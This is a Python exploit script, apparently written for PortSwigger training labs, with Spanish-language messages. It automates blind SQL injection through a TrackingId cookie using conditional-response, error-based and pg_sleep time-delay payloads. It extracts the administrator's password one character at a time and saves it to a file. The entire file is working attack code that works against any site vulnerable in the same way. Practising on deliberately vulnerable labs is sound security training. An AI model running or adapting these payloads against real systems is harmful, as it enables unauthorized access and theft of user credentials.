from pwn import log
import requests, signal, time, pdb, sys, string
from colorama import Fore, Style
import argparse

class Exploit:
    amarillo = Fore.YELLOW
    reset = Style.RESET_ALL
    CHARACTERS = string.ascii_lowercase + string.digits
    stringpass = 'PASSWORD:'
    PASSWORD = ""
    count=0
    
    def __init__(self, url, trackingid, session, option, lenghtpass, user):
        self.URL = url
        self.TrackingId = trackingid
        self.session = session
        self.op = option
        self.tamañoPassword = lenghtpass + 1
        self.user = user

    def handler(self, sig, frame):
        print("\n\n[!] Saliendo...\n")
        sys.exit(1)
    
    def injection (self, pos, char):
        if self.op == '1':
            return f"' and (select substring(password,{pos},1) from users where username='{self.user}')='{char}"
        if self.op == '2':
            return f"'||(select case when substr(password,{pos},1)='{char}' then to_char(1/0) else '' end from users where username = '{self.user}')||'"
        if self.op == '3':
            return f"' || (select case when (substring(password,{pos},1)='{char}') then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -"
        # and length(password)=20)||'"

    def successCondition(self, pos, char):
        self.PASSWORD += char
        repeatspace = '*' * (self.tamañoPassword - pos - 1)
        log.info(f'{" "*(len(self.stringpass))}{self.amarillo}{self.PASSWORD}{self.reset}{repeatspace} [{pos}/{self.tamañoPassword-1}]')
        self.count = 0

   
    def run(self):
        signal.signal(signal.SIGINT, self.handler)
        


        sniffingProgress = log.progress("Fuerza Bruta")
        sniffingProgress.status("Iniciando ataque de fuerza bruta...")
        time.sleep(2)
        sniffingPassword = log.progress(self.stringpass)
        

        for position in range(1, self.tamañoPassword):
            for character in self.CHARACTERS:
                self.count+=1
                if self.count == len(self.CHARACTERS):
                    log.error("No Connection...")
                    sys.exit(1)

                cookie = {
                    'TrackingId': f'{self.TrackingId}{self.injection(position,character)}',
                    'session': self.session
                }
         
                START = time.time() 
                respuesta = requests.get(self.URL, cookies=cookie)  
                #sniffingProgress.status(cookie['TrackingId'])
                END = time.time()

                if self.op == '1':
                    if "Welcome back!" in respuesta.text:
                        self.successCondition(position, character)
                        break

                if self.op == '2':
                    if respuesta.status_code == 500:
                        self.successCondition(position, character)
                        break

                if self.op == '3':
                    if END - START > 5:
                        self.successCondition(position, character)
                        break

            if position == self.tamañoPassword:
                print()
                sniffingPassword.status(f'{self.user}: {self.amarillo}{self.PASSWORD}{self.reset}')
            
    def passview(self):
        return self.PASSWORD
        
def get_argument():
    parser = argparse.ArgumentParser(description='Blind SQL Injection with conditional responses-errors and time delays || portswigger labs.')
    parser.add_argument('-u', '--url', dest='url', required=True, help='Proporcionar URL de la página.')
    parser.add_argument('-t', '--trakingid', dest='trackingid', required=True, help='Proporcionar el TrackingId de la solicitud.')
    parser.add_argument('-s', '--session', dest='session', required=True, help='Proporcionar el código de la sesión.')
    parser.add_argument('-o', '--option', dest='option', required=True, help='1- resposes, 2- error y 3 para delay.')
    #parser.add_argument('-l', '--lenght', dest='lenght', required=True, help='Proporcionar el largo total del password')
    
    return parser.parse_args()



def main(): 

    user = 'administrator' 
    lenPassword= 20
    args = get_argument()
    
    exploit = Exploit(args.url, args.trackingid, args.session, args.option, lenPassword, user)
    exploit.run()
    with open("datapass.txt", "a") as dp:
        dp.write(f'El password de {user}: {exploit.passview()}')

if __name__ == '__main__':
    main()